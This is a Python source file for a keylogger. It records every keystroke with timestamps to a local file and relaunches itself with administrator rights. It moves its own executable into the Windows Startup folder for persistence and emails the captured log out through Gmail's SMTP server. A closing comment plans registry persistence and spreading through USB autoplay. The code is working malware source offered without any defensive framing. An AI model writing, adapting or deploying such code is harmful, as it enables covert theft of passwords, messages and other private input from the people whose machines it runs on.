import subprocess
import os
import sys
import shutil
import time
requiredModules = ["pynput", "datetime", "pyuac", "secure-smtplib"]

for module in requiredModules:
    try:
        __import__(module)
    except ModuleNotFoundError:
        subprocess.run(["pip", "install", module])

from datetime import datetime
from pynput import keyboard
import pyuac
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders



class Keylogger:

    def __init__(self):
        self.log = "Keylogger started ..."

    # this are primary methods which ishould be done
    #
    #
    #
    def sendEmail(self):

        # email config
        senderEmail = ''
        senderPassword = ''
        smtpServer = 'smtp.gmail.com'
        smtpPort = 587
        toEmail = ''

        # Now creating email message
        message = MIMEMultipart()
        message["From"] = senderEmail
        message['To'] = toEmail
        message['Subject'] = 'Key logs'

        # attaching file which is keylogs.txt ignore the name
        filePath = './data.txt'
        attachment = open(filePath, 'rb')
        base = MIMEBase('application', 'octet-stream')
        base.set_payload(attachment.read())
        encoders.encode_base64(base)
        base.add_header('Content-Disposition', f'attachment; filename={filePath}')
        message.attach(base)

        # attaching the text body
        message.attach(MIMEText('', 'plain'))
        try:
            # now sending email
            with smtplib.SMTP(smtpServer, smtpPort) as server:
                server.starttls()
                server.login(senderEmail, senderPassword)
                server.sendmail(senderEmail, toEmail, message.as_string())
        except Exception as err:
            print(err)






    def addToStartup(self):
        try:
            startupFolder = os.path.join(os.getenv("ProgramData"), "Microsoft", "Windows",
                                         "Start Menu", "Programs", "Startup")
            exePath = os.path.abspath(sys.argv[0])
            shutil.move(exePath, os.path.join(startupFolder, os.path.basename(sys.argv[0])))
        except Exception as e:
            print("error in moving .exe to startup")
            print(e)

    # This are easy methods to understand

    def saveLogToFile(self, log):
        with open("data.txt", "a") as file:
            file.write(log)
            file.close()

    def saveData(self, key):
        try:
            currentKey = str(key.char) 
        except AttributeError:
            if key == key.space:
                currentKey = "SPACE" 
            elif key == key.esc:
                currentKey = "ESC" 
            else:
                currentKey = " " + str(key) + " "

        currentTime = datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
        log = currentTime + " -> " + currentKey + "\n"
        self.saveLogToFile(log)

    def run(self):

        with keyboard.Listener(on_press=self.saveData) as keyboardListener:
            keyboardListener.join()





if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        print("Re-launching as admin!")
        try:
            pyuac.runAsAdmin()
        except Exception as e:
            try:
                pyuac.runAsAdmin()
            except:
                pass

    obj = Keylogger()
    threading.Thread(target=obj.run).start()

    time.sleep(20)
    obj.sendEmail()

        
































"""
--> tasks which I should do now 
    
    - the script should move to registry of windows

    - also for pendrive just research about autoplay and python code 
      to on that also


"""


